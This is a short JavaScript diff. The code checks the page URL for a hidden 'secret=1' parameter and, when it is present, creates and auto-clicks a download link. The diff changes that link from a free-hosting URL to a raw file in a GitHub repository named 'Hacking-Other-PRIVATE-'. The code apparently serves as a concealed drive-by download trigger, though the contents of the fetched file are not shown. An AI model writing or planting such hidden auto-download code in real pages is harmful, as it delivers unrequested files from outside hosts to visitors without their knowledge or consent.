@@ -1,6 +1,6 @@
 if (window.location.search.indexOf('secret=1') > -1) {
     var link = document.createElement('a');
-link.href = 'https://mehliug.000webhostapp.com/.hehehe';
+link.href = 'https://github.com/guilhemguilhem/Hacking-Other-PRIVATE-/raw/main/HEHEHE.txt';
 link.download = '';
 document.body.appendChild(link);
 link.click();
